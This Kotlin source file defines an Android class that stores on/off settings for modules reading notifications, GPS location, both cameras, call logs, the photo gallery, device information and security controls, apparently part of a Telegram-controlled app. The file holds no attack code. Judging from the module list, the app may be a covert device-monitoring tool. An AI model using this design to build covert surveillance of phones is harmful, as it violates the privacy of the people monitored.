package com.rtk.telegrammanager.modulemanager

import android.content.Context

class ModuleManager(context: Context) {

    private val prefs = context.getSharedPreferences(
        "rtk_module_manager",
        Context.MODE_PRIVATE
    )

    companion object {
        val MODULES = listOf(
            ModuleDefinition(
                "notification",
                "Notification",
                "Notification reader"
            ),
            ModuleDefinition(
                "location",
                "Location",
                "GPS location"
            ),
            ModuleDefinition(
                "camera",
                "Camera",
                "Front and back camera"
            ),
            ModuleDefinition(
                "calllog",
                "Call Log",
                "Call history"
            ),
            ModuleDefinition(
                "gallery",
                "Gallery",
                "Photo gallery"
            ),
            ModuleDefinition(
                "device",
                "Device",
                "Device information"
            ),
            ModuleDefinition(
                "security",
                "Security",
                "Device security controls"
            )
        )
    }

    fun isEnabled(id: String): Boolean {
        val definition = MODULES.firstOrNull { it.id == id }
        return prefs.getBoolean(
            id,
            definition?.defaultEnabled ?: false
        )
    }

    fun setEnabled(id: String, enabled: Boolean) {
        prefs.edit()
            .putBoolean(id, enabled)
            .apply()
    }

    fun getAll(): Map<String, Boolean> {
        return MODULES.associate {
            it.id to isEnabled(it.id)
        }
    }

    fun resetDefaults() {
        prefs.edit().clear().apply()
    }
}
